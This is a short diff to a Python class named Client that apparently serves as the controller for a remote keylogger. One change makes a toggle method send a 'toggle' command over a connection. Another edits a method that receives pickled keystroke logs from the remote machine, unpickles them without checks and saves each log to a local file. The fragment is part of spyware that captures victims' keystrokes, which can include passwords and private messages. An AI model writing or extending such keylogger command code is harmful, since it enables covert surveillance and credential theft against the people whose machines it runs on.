@@ -69,7 +69,7 @@ class Client:
         :return:
         """
         # Toggling will be done client-side, technically server-side
-        pass
+        self.send("toggle")
 
     def getKeyloggerOutput(self):
         """
@@ -80,7 +80,7 @@ class Client:
         header = int(self.conn.recv(HEADER).decode(FORMAT))
         pickledlogs = self.conn.recv(header)
         pickledlogs = pickle.loads(pickledlogs)
-        print(type(pickledlogs))
+        # print(pickledlogs)
         for log in pickledlogs:
             with open(f"{MAINFOLDER}logs/{log[:12]}", "w+") as f:
                 f.write(log)
